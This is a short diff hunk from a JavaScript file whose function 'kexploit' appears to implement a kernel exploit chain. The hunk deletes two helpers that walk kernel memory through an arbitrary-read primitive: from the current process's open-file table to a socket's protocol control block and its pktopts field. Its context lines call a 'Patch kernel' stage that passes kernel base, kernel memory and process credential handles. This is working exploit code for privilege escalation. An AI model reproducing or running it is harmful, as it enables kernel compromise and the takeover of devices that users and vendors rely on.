@@ -1819,19 +1819,7 @@ export async function kexploit() {
             pktopts_sds, dirty_sd, reqs1_addr, kernel_addr, sds);
 
   
-function get_fd_data_addr(sock, read_fn) {
-  const fdesc = kernel.addr.curproc
-              + CURPROC_OFILES
-              + BigInt(sock) * BigInt(SIZEOF_OFILES);
-  const filep = read_fn(fdesc);
-  return read_fn(filep);
-}
 
-function get_sock_pktopts(sock, read_fn) {
-  const sock_data = get_fd_data_addr(sock, read_fn);
-  const pcb       = read_fn(sock_data + BigInt(SO_PCB));
-  return read_fn(pcb + BigInt(INPCB_PKTOPTS));
-}
 
         log('\nSTAGE: Patch kernel');
         await patch_kernel(kbase, kmem, p_ucred, restore_info);
